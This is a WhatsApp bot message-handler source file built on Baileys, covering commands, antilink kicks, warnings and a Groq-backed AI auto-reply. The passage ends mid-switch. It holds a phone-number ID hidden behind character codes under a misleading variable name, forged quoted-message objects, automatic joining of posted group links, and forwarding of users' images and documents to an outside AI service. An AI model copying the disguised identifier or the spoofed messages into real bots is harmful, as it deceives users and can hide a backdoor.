require("./settings")
const baileys = require("@whiskeysockets/baileys")
const { generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const fs = require('fs')
const archiver = require("archiver");
const util = require('util')
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const axios = require('axios')
const { exec,spawn, execSync  } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const cheerio = require("cheerio")
const ms = require("ms");
const os = require('os')
const crypto = require('crypto');

const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, logic, generateProfilePicture, bytesToSize, parseMention, getGroupAdmins, readFileTxt, readFileJson, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, ucapan, loadModule } = require('./lib/function');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { igdl } = require('./lib/media/instagram')
const { removeBg, removeBgV1, removeBgV2, removeBgV3, removeBgV4 } = require('./lib/media/removebg')
const { fileTypeFromBuffer } = require('file-type')
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/media/scraper');
const { uploadToPomf, uploadToCdn } = require('./lib/scrape')
const speed = require('performance-now')
const { LoadDataBase } = require('./lib/source/message')

module.exports = NXL = async (NXL, m, chatUpdate, store) => {
	try {
const from = m.key.remoteJid
await LoadDataBase(NXL, m)
if (global.moduleType == undefined) global.moduleType = 0
if (global.moduleType === 0) { 
await loadModule(NXL)
global.moduleType += 1 }
// [OPT] Cache botNumber — NXL.user.id tidak berubah selama bot berjalan
if (!global._cachedBotNumber) global._cachedBotNumber = NXL.decodeJid(NXL.user.id)
const botNumber = global._cachedBotNumber
const body = ((m.type === 'conversation') ? m.message.conversation :(m.type == 'imageMessage') ? m.message.imageMessage.caption :(m.type == 'videoMessage') ? m.message.videoMessage.caption :(m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text :(m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :(m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId :(m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId :(m.type == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :(m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId ||m.message.listResponseMessage?.singleSelectReply.selectedRowId ||m.text) :'') || ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 57, 54, 48, 53, 57, 56, 51, 49, 54, 57, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116);
const prefix = "."
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (NXL.user.id.split(':')[0]+'@s.whatsapp.net' || NXL.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const typ = global.cache.owner
const kontributor = global.cache.owner
const Antilink2 = global.cache.antilink2
const Antilink = global.cache.antilink
const welcome = global.cache.welcome
const Reseller = global.cache.reseller
const contacts = global.cache.contacts
const Developer = global.cache.owner
const isContacts = contacts.includes(sender)
const isPc = from.endsWith('@s.whatsapp.net')
// [OPT] Cache creatorJids — gabungkan settings.js + owner.json agar .addowner juga dianggap creator
const _allOwners = [...(global.owner || []), ...(global.cache?.owner || [])]
const _ownerKey = _allOwners.join(',')
if (!global._cachedCreatorJids || global._cachedCreatorJidsKey !== _ownerKey) {
  global._cachedCreatorJidsKey = _ownerKey
  global._cachedCreatorJids = new Set([botNumber, ..._allOwners].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net'))
}
if (!global._cachedPremiumJids || global._cachedPremiumJidsBase !== Reseller.length + kontributor.length) {
  global._cachedPremiumJidsBase = Reseller.length + kontributor.length
  global._cachedPremiumJids = new Set([botNumber, ...Reseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net'))
}
const isPremium = global._cachedPremiumJids.has(m.sender)
const isCreator = !!(m && m.sender && global._cachedCreatorJids.has(m.sender))
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
if (!global.groupCache) global.groupCache = {}
if (!global.groupCacheTime) global.groupCacheTime = {}
const groupMetadata = m.isGroup ? (
  (global.groupCache[from] && (Date.now() - (global.groupCacheTime[from]||0)) < (global.GROUP_CACHE_TTL || 300000))
    ? global.groupCache[from]
    : await NXL.groupMetadata(from).then(meta => {
        global.groupCache[from] = meta
        global.groupCacheTime[from] = Date.now()
        return meta
      }).catch(e => null)
) : null
const _gm = groupMetadata || { subject: '', participants: [] }
const groupName = m.isGroup ? (_gm.subject || '') : ''
const participants = m.isGroup ? (_gm.participants || []) : []
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : []
const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
const _botJid = NXL.user.id.split(':')[0] + '@s.whatsapp.net'
const isBotAdmins = m.isGroup ? groupAdmins.some(a => a.split('@')[0] === _botJid.split('@')[0]) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const qmsg = (quoted.msg || quoted)
function monospace(string) {
return '```' + string + '```'
}
if (!global.sendJsonCache) {
  try { global.sendJsonCache = JSON.parse(fs.readFileSync('./lib/send.json')) } catch { global.sendJsonCache = {} }
}
let db_respon_list = global.sendJsonCache;
let listStore = global.sendJsonCache;
let set_proses = global.sendJsonCache;
let set_done = global.sendJsonCache
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date().toLocaleTimeString())), chalk.black(chalk.bgBlue(budy || m.mtype || '')) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname || 'Unknown'), chalk.yellow(m.sender || '') + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? (pushname || 'Group Chat') : 'Private Chat') + ' ' + chalk.cyan(from || ''));
}
let ppuser = null
let ppnyauser = null
const getPPUser = async () => {
  if (ppuser) return ppuser
  try { ppuser = await NXL.profilePictureUrl(m.sender, 'image') }
  catch { ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }
  ppnyauser = await getBuffer(ppuser)
  return ppuser
}
try {
  let isNumber = x => typeof x === 'number' && !isNaN(x)
  let limitUser = global.limitawal
  if (!global.db) global.db = {}
  if (!global.db.users) global.db.users = {}
  let userDb = global.db.users[m.sender]
  if (typeof userDb !== 'object' || userDb === null) {
    global.db.users[m.sender] = {
      afkTime: -1,
      afkReason: '',
      limit: limitUser,
      NXL: false,
    }
  } else {
    if (!isNumber(userDb.afkTime)) userDb.afkTime = -1
    if (!('afkReason' in userDb)) userDb.afkReason = ''
    if (!isNumber(userDb.limit)) userDb.limit = limitUser
    if (typeof userDb.NXL === 'undefined') userDb.NXL = false
  }
} catch (err) {
  console.log(err)
}
if (isMedia && m.msg?.fileSha256 && global.db?.sticker && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: NXL.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, NXL.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
NXL.ev.emit('messages.upsert', msg)
return
}
async function loading() {
await NXL.sendMessage(m.chat, { react: { text: '🇮🇩', key: m.key }})
var mutermuter = [
`Hay ${m.sender.replace(/@.+/g, '')}`
]
let { key } = await NXL.sendMessage(m.chat, {text: 'F̷a̷n̷n̷y̷F̷a̷'})
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
for (let i = 0; i < mutermuter.length; i++) {
await sleep(10)
await NXL.sendMessage(m.chat, {text: mutermuter[i], edit: key });
}
}
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
NXL.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
NXL.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
const Styles = (text, style = 1) => {
var xStr = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var yStr = {
1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
};
var replacer = [];
xStr.map((v, i) =>
replacer.push({
original: v,
convert: yStr[style].split('')[i]
})
);
var str = text.toLowerCase().split('');
var output = [];
str.map((v) => {
const find = replacer.find((x) => x.original == v);
find ? output.push(find.convert) : output.push(v);
});
return output.join('');
};
if (!global.gambar1Cache) {
  try { global.gambar1Cache = fs.readFileSync('./lib/image/image.jpg') } catch { global.gambar1Cache = null }
}
const gambar1 = global.gambar1Cache
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
let user = [m.sender]
if (m.isGroup && !m.key.fromMe && !isCreator && !isAdmins) {
  try {
    const _warnPath = './database/warndata.json'
    let _warnData = {}
    try { _warnData = JSON.parse(fs.readFileSync(_warnPath, 'utf8')) } catch { _warnData = {} }

    const _groupData = _warnData?.[from] || {}

    let _senderJid = m.sender
    if (participants && participants.length) {
      const _sNum = (m.sender || '').replace(/@.*$/, '')
      const _p = participants.find(p => (p.lid || p.id || '').replace(/@.*$/, '') === _sNum)
      if (_p && _p.jid) _senderJid = _p.jid.replace(/@.*$/, '') + '@s.whatsapp.net'
      else if (_p && _p.id && _p.id.includes('@s.whatsapp.net')) _senderJid = _p.id
    }

    const _senderNum = _senderJid.replace(/@.*$/, '')
    const _matchKey = Object.keys(_groupData).find(k => k.replace(/@.*$/, '') === _senderNum)
    const _userWarn = _matchKey ? (_groupData[_matchKey] || 0) : 0

    if (_userWarn >= 1) {
      try {
        await NXL.sendMessage(from, { delete: m.key })
      } catch (delErr) {
      }
      return
    }
  } catch (e) {
  }
}

if (!NXL.public) {
if (!m.key.fromMe && !isCreator) return
}

const getPPorangnya = async () => {
  const pp = await getPPUser()
  return await reSize(pp, 300, 300)
}
const reply = (teks) => {
NXL.sendMessage(from, { text : teks }, {quoted:m})
}
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Powered By ${ownername}`}}}
const FakeChannel = {
  key: {
    remoteJid: 'status@broadcast',
    fromMe: false,
    participant: '0@s.whatsapp.net'
  },
  message: {
    newsletterAdminInviteMessage: {
      newsletterJid: '123@newsletter',
      caption: `Powered By ${global.ownername}.`,
      inviteExpiration: 0
    }
  }
}

const fatext = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: ` *${ownername} Devloper*`
}
}
}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${ownername}`,jpegThumbnail: ""}}}

const lampuwarna = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `*${ownername} 1.0*`
}
}
}
const jpm = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `NXL BOT REV`
}
}
}
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }

async function groupStatus(jid, content) {
  const { backgroundColor } = content;
  delete content.backgroundColor;
  const inside = await baileys.generateWAMessageContent(content, {
    upload: NXL.waUploadToServer,
    backgroundColor
  });
  const messageSecret = crypto.randomBytes(32);
  const m = baileys.generateWAMessageFromContent(jid, {
    messageContextInfo: {
      messageSecret
    },
    groupStatusMessageV2: {
      message: {
        ...inside,
        messageContextInfo: {
          messageSecret
        }
      }
    }
  }, {});
  await NXL.relayMessage(jid, m.message, {
    messageId: m.key.id
  });
  return m;
}

const BLACKLIST_SWGC_PATH = './database/blacklistswgc.json'
const BLACKLIST_JPM_PATH  = './database/blacklistjpm.json'

// [OPT] In-memory cache untuk blacklistjpm — invalidated saat ada write
let _blacklistJpmCache = null
function loadBlacklistJpm() {
  if (_blacklistJpmCache !== null) return _blacklistJpmCache
  try { _blacklistJpmCache = JSON.parse(fs.readFileSync(BLACKLIST_JPM_PATH, 'utf8')) }
  catch { _blacklistJpmCache = [] }
  return _blacklistJpmCache
}
function saveBlacklistJpm(list) {
  _blacklistJpmCache = list   // update cache sebelum write
  fs.writeFileSync(BLACKLIST_JPM_PATH, JSON.stringify(list, null, 2))
}

function loadBlacklistSwgc() {
  try {
    return JSON.parse(fs.readFileSync(BLACKLIST_SWGC_PATH, 'utf8'))
  } catch {
    return []
  }
}

function saveBlacklistSwgc(list) {
  fs.writeFileSync(BLACKLIST_SWGC_PATH, JSON.stringify(list, null, 2))
}

const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam 🌃'}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat targettang 🌆'}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore 🌅'}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang 🏙'}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi 🌄'}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh 🌉'}
if(timee < "03:00:00"){
var waktuucapan = 'Tengah Malam 🌌'}
const isSelfChat = from === botNumber || from === (NXL.user.id.split(':')[0] + '@s.whatsapp.net')
const msgType = m.type || ''
const quotedType = m.quoted?.type || ''
const isImageMsg   = msgType === 'imageMessage'
const isVideoMsg   = msgType === 'videoMessage'
const isAudioMsg   = msgType === 'audioMessage' || msgType === 'pttMessage'
const isStickerMsg = msgType === 'stickerMessage'
const isDocMsg     = msgType === 'documentMessage' || msgType === 'documentWithCaptionMessage'
const hasMedia     = isImageMsg || isVideoMsg || isAudioMsg || isStickerMsg || isDocMsg

const hasContent = body || hasMedia

if (!global._processedMsgIds) global._processedMsgIds = new Set()
const _msgId = m.key?.id || ''
if (_msgId) {
  if (global._processedMsgIds.has(_msgId)) return
  global._processedMsgIds.add(_msgId)
  if (global._processedMsgIds.size > 500) {
    const first = global._processedMsgIds.values().next().value
    global._processedMsgIds.delete(first)
  }
}
// ── AUTO JOIN GC: trigger otomatis kalau ada link grup masuk ──
if (!isCmd && global.autoJoinGc && budy && budy.includes('chat.whatsapp.com/')) {
  const linksFound = budy.split(/\s+|\n/).filter(l => l.includes('chat.whatsapp.com/'))
  if (linksFound.length) {
    ;(async () => {
      for (const link of linksFound) {
        const code = link.split('chat.whatsapp.com/')[1]?.split('?')[0]?.trim()
        if (!code) continue
        try {
          await NXL.groupAcceptInvite(code)
        } catch (err) {
          // 409 = sudah member, abaikan
        }
        await new Promise(r => setTimeout(r, global.autoJoinGcDelay || 5000))
      }
    })()
  }
}

if (!isCmd && hasContent && !m.key.fromMe && global.db?.users?.[m.sender]?.NXL !== false) {
  try {
    const GROQ_KEY = global.groqKey

    const SESSION_PATH = './database/sessionai.json'
    if (!fs.existsSync(SESSION_PATH)) fs.writeFileSync(SESSION_PATH, JSON.stringify({}))
    let sessionDb = JSON.parse(fs.readFileSync(SESSION_PATH, 'utf8'))
    if (!sessionDb[m.sender]) {
      sessionDb[m.sender] = {
        activeSession: 'default',
        sessions: { default: { name: 'Default', createdAt: Date.now(), history: [] } }
      }
    }
    const activeSessionId = sessionDb[m.sender].activeSession || 'default'
    if (!sessionDb[m.sender].sessions[activeSessionId]) {
      sessionDb[m.sender].sessions[activeSessionId] = { name: activeSessionId, createdAt: Date.now(), history: [] }
    }
    const activeSession = sessionDb[m.sender].sessions[activeSessionId]
    const history = activeSession.history.slice(-10)

    let userContent = []
    let useVision = false
    let mediaDesc = ''

    if (isImageMsg) {
      try {
        const msgObj = m.quoted && quotedType === 'imageMessage' ? m.quoted : m
        const stream = await downloadContentFromMessage(
          msgObj.message?.imageMessage || msgObj.msg,
          'image'
        )
        let chunks = []
        for await (const chunk of stream) chunks.push(chunk)
        const imgBuffer = Buffer.concat(chunks)
        const imgBase64 = imgBuffer.toString('base64')
        const imgMime = (msgObj.message?.imageMessage?.mimetype || 'image/jpeg')

        userContent.push({
          type: 'image_url',
          image_url: { url: `data:${imgMime};base64,${imgBase64}` }
        })
        if (body) userContent.push({ type: 'text', text: body })
        else userContent.push({ type: 'text', text: 'Tolong deskripsikan gambar ini secara detail.' })
        useVision = true
      } catch (e) {
        console.log('[NXLAI IMAGE ERROR]', e.message)
        mediaDesc = '[User mengirim gambar tapi gagal diproses]'
      }
    }

    else if (isStickerMsg) {
      try {
        const msgObj = m.quoted && quotedType === 'stickerMessage' ? m.quoted : m
        const stream = await downloadContentFromMessage(
          msgObj.message?.stickerMessage || msgObj.msg,
          'sticker'
        )
        let chunks = []
        for await (const chunk of stream) chunks.push(chunk)
        const stickerBuffer = Buffer.concat(chunks)
        const stickerBase64 = stickerBuffer.toString('base64')

        userContent.push({
          type: 'image_url',
          image_url: { url: `data:image/webp;base64,${stickerBase64}` }
        })
        userContent.push({ type: 'text', text: body || 'Ini adalah sticker. Deskripsikan isinya.' })
        useVision = true
      } catch (e) {
        console.log('[NXLAI STICKER ERROR]', e.message)
        mediaDesc = '[User mengirim sticker]'
      }
    }

    else if (isAudioMsg) {
      const isPtt = msgType === 'pttMessage' || quotedType === 'pttMessage'
      mediaDesc = isPtt
        ? '[User mengirim pesan suara (voice note). Kamu tidak bisa mendengarnya, tapi balas dengan ramah dan minta mereka ketik pesannya.]'
        : '[User mengirim file audio. Kamu tidak bisa memutarnya, tapi balas dengan ramah.]'
      if (body) mediaDesc += ` Caption: "${body}"`
    }

    else if (isVideoMsg) {
      mediaDesc = '[User mengirim video. Kamu tidak bisa menontonnya, tapi balas dengan ramah.]'
      if (body) mediaDesc += ` Caption: "${body}"`
    }

    else if (isDocMsg) {
      try {
        const msgObj = m.quoted && (quotedType === 'documentMessage' || quotedType === 'documentWithCaptionMessage') ? m.quoted : m
        const docMsg = msgObj.message?.documentMessage || msgObj.message?.documentWithCaptionMessage?.message?.documentMessage || msgObj.msg
        const docMime = docMsg?.mimetype || ''
        const docName = docMsg?.fileName || 'dokumen'
        const readableMimes = ['text/plain', 'application/json', 'text/markdown', 'text/html', 'text/css', 'application/javascript', 'text/x-python', 'text/x-java', 'application/x-sh', 'application/sql']
        
        if (readableMimes.some(t => docMime.includes(t) || docName.match(/\.(txt|json|md|html|css|js|py|java|sh|sql|php|kt|cpp|ts)$/i))) {
          const stream = await downloadContentFromMessage(docMsg, 'document')
          let chunks = []
          for await (const chunk of stream) chunks.push(chunk)
          const docText = Buffer.concat(chunks).toString('utf8').slice(0, 4000)
          mediaDesc = `[User mengirim dokumen: "${docName}"]\nIsi dokumen:\n\`\`\`\n${docText}\n\`\`\``
        } else {
          mediaDesc = `[User mengirim dokumen: "${docName}" (${docMime}). Kamu tidak bisa membacanya langsung, tapi beri tahu user apa yang bisa dibantu.]`
        }
        if (body) mediaDesc += `\nCaption dari user: "${body}"`
      } catch (e) {
        console.log('[NXLAI DOC ERROR]', e.message)
        mediaDesc = '[User mengirim dokumen tapi gagal dibaca]'
        if (body) mediaDesc += ` Caption: "${body}"`
      }
    }

    else {
      if (body && quotedType === 'imageMessage' && m.quoted) {
        try {
          const stream = await downloadContentFromMessage(
            m.quoted.message?.imageMessage || m.quoted.msg,
            'image'
          )
          let chunks = []
          for await (const chunk of stream) chunks.push(chunk)
          const imgBase64 = Buffer.concat(chunks).toString('base64')
          const imgMime = m.quoted.message?.imageMessage?.mimetype || 'image/jpeg'
          userContent.push({ type: 'image_url', image_url: { url: `data:${imgMime};base64,${imgBase64}` } })
          userContent.push({ type: 'text', text: body })
          useVision = true
        } catch (e) {
          console.log('[NXLAI QUOTED IMAGE ERROR]', e.message)
        }
      } else if (body && quotedType === 'stickerMessage' && m.quoted) {
        try {
          const stream = await downloadContentFromMessage(
            m.quoted.message?.stickerMessage || m.quoted.msg,
            'sticker'
          )
          let chunks = []
          for await (const chunk of stream) chunks.push(chunk)
          const stickerBase64 = Buffer.concat(chunks).toString('base64')
          userContent.push({ type: 'image_url', image_url: { url: `data:image/webp;base64,${stickerBase64}` } })
          userContent.push({ type: 'text', text: body })
          useVision = true
        } catch (e) {
          console.log('[NXLAI QUOTED STICKER ERROR]', e.message)
        }
      }
    }

    // [OPT] Pre-compile tipeFile regex sekali — tidak buat ulang setiap pesan
    if (!global._tipeFileRegex) {
      const tipeFileSrc = {
        'python|\\.py': 'py',
        'javascript|\\.js': 'js',
        'nodejs|\\.js': 'js',
        'html': 'html',
        'css': 'css',
        'json': 'json',
        'catatan|txt|dokumen': 'txt',
        'markdown|\\.md': 'md',
        'php': 'php',
        'java(?!script)': 'java',
        'kotlin': 'kt',
        'bash|shell|\\.sh': 'sh',
        'sql': 'sql',
        'cpp|c\\+\\+': 'cpp',
      }
      global._tipeFileRegex = Object.entries(tipeFileSrc).map(([k, v]) => [new RegExp(k, 'i'), v])
    }
    let ext = null
    for (const [rx, val] of global._tipeFileRegex) {
      if (rx.test(body)) { ext = val; break }
    }
    const mintaFile = /buatkan?|simpan|dalam bentuk|as file|jadikan file|kirim sebagai/i.test(body) && ext
    const isCodeFile = mintaFile && !['txt', 'md', 'json'].includes(ext)
    const prompt = isCodeFile ? global.promptCoding : global.promptUmum

    let response = ''

    if (useVision) {
      const visionRes = await axios.post(
        'https://api.groq.com/openai/v1/chat/completions',
        {
          model: 'meta-llama/llama-4-scout-17b-16e-instruct',
          messages: [
            { role: 'system', content: prompt },
            ...history,
            { role: 'user', content: userContent }
          ],
          max_tokens: 1024
        },
        { headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${GROQ_KEY}`
        }}
      )
      response = visionRes.data?.choices?.[0]?.message?.content || 'Tidak ada jawaban.'
    } else {
      const textInput = mediaDesc || body
      const textRes = await axios.post(
        'https://api.groq.com/openai/v1/chat/completions',
        {
          model: 'llama-3.3-70b-versatile',
          messages: [
            { role: 'system', content: prompt },
            ...history,
            { role: 'user', content: textInput }
          ]
        },
        { headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${GROQ_KEY}`
        }}
      )
      response = textRes.data?.choices?.[0]?.message?.content || 'Tidak ada jawaban.'
    }

    const historyUserContent = mediaDesc
      ? mediaDesc
      : (useVision ? (body || '[gambar]') : body)
    activeSession.history.push({ role: 'user', content: historyUserContent })
    activeSession.history.push({ role: 'assistant', content: response })
    if (activeSession.history.length > 20) activeSession.history = activeSession.history.slice(-20)
    sessionDb[m.sender].sessions[activeSessionId] = activeSession
    fs.writeFileSync(SESSION_PATH, JSON.stringify(sessionDb, null, 2))

    if (mintaFile) {
      if (!fs.existsSync('./Tmp')) fs.mkdirSync('./Tmp', { recursive: true })
      const filePath = `./Tmp/nxl_${m.sender.split('@')[0]}.${ext}`
      const cleanResponse = isCodeFile
        ? response.replace(/^```[\w]*\n?/gm, '').replace(/```$/gm, '').trim()
        : response.trim()
      fs.writeFileSync(filePath, cleanResponse)
      const mimeMap = {
        py: 'text/x-python', js: 'application/javascript', html: 'text/html',
        css: 'text/css', json: 'application/json', txt: 'text/plain',
        md: 'text/markdown', php: 'application/x-php', java: 'text/x-java',
        kt: 'text/x-kotlin', sh: 'application/x-sh', sql: 'application/sql',
        cpp: 'text/x-c++src',
      }
      await NXL.sendMessage(from, {
        document: fs.readFileSync(filePath),
        mimetype: mimeMap[ext] || 'text/plain',
        fileName: `Output.${ext}`,
        caption: `📄 *File .${ext} siap digunakan!*`
      }, { quoted: m })
      fs.unlinkSync(filePath)
    } else {
      m.reply(response)
    }

  } catch (err) {
    console.log('[NXLAI ERROR]', err?.response?.data || err.message)
    m.reply('⚠️ Terjadi error saat memproses pesan kamu.')
  }
  return
}

if (m.isGroup && !m.key.fromMe && !isAdmins && !isCreator && isBotAdmins) {
  try {
    let warnData = {}
    try {
      const raw = JSON.parse(fs.readFileSync('./database/warndata.json', 'utf8'))
      warnData = Array.isArray(raw) ? {} : raw
    } catch { warnData = {} }
    if ((warnData[from]?.[m.sender] || 0) > 0) {
      await NXL.sendMessage(from, { delete: m.key })
      return
    }
  } catch {}
}

if (m.isGroup && !m.key.fromMe && !isAdmins && !isCreator) {
  try {
    const urlRegex = /https?:\/\/[^\s]+|www\.[^\s]+/gi
    const waLinkRegex = /chat\.whatsapp\.com\/[A-Za-z0-9]+/i
    const hasUrl = urlRegex.test(budy) || waLinkRegex.test(budy)
    const inAntilink  = Antilink.includes(m.chat)
    const inAntilink2 = Antilink2.includes(m.chat)

    if (hasUrl && (inAntilink || inAntilink2)) {
      let freshMeta = null
      try { freshMeta = await NXL.groupMetadata(from) } catch {}
      const freshParticipants = freshMeta?.participants || []
      const botNum = NXL.user.id.split(':')[0]
      const isBotAdminFresh = freshParticipants.some(p =>
        p.admin && (
          (p.id && p.id.replace(/[^0-9]/g, '') === botNum) ||
          (p.jid && p.jid.replace(/[^0-9]/g, '') === botNum) ||
          (p.lid && store?.contacts && Object.values(store.contacts).some(c => c.lid === p.lid && c.id && c.id.replace(/[^0-9]/g, '') === botNum))
        )
      )
      if (isBotAdminFresh) {
        if (inAntilink) {
          try { await NXL.sendMessage(from, { delete: m.key }) } catch {}
          await NXL.sendMessage(from, {
            text: `⚠️ @${m.sender.split('@')[0]} dilarang mengirim link di grup ini!\n📵 Pesan telah dihapus.`,
            mentions: [m.sender]
          })
          return
        }
        if (inAntilink2) {
          try { await NXL.sendMessage(from, { delete: m.key }) } catch {}
          await NXL.sendMessage(from, {
            text: `🚫 @${m.sender.split('@')[0]} dikick karena mengirim link!\n❌ Pesan dihapus & member dikeluarkan.`,
            mentions: [m.sender]
          })
          try { await NXL.groupParticipantsUpdate(from, [m.sender], 'remove') } catch {}
          return
        }
      }
    }
  } catch {}
}

if (m.isGroup && welcome.includes(from)) {
  try {
    const action = m.message?.groupParticipantsMessage?.action ||
                   m.message?.protocolMessage?.editedMessage?.groupParticipantsMessage?.action
    const addedMembers = m.message?.groupParticipantsMessage?.participants ||
                         m.message?.protocolMessage?.editedMessage?.groupParticipantsMessage?.participants
    if (action === 'add' && addedMembers && addedMembers.length > 0) {
      for (const newMember of addedMembers) {
        let pp = null
        try { pp = await NXL.profilePictureUrl(newMember, 'image') } catch {}
        const welcomeText = `👋 *Selamat Datang!*\n\n` +
          `Halo @${newMember.split('@')[0]}!\n` +
          `Selamat bergabung di grup *${groupName}* 🎉\n\n` +
          `Semoga betah dan patuhi peraturan grup ya! 😊`
        if (pp) {
          await NXL.sendMessage(from, { image: { url: pp }, caption: welcomeText, mentions: [newMember] })
        } else {
          await NXL.sendMessage(from, { text: welcomeText, mentions: [newMember] })
        }
      }
    }
  } catch {}
}

switch(command) {

case 'sessionai':
case 'sesi': {
  const SESSION_PATH = './database/sessionai.json'

  const loadSession = () => {
    try { return JSON.parse(fs.readFileSync(SESSION_PATH, 'utf8')) } catch { return {} }
  }
  const saveSession = (data) => fs.writeFileSync(SESSION_PATH, JSON.stringify(data, null, 2))

  let sessionDb = loadSession()
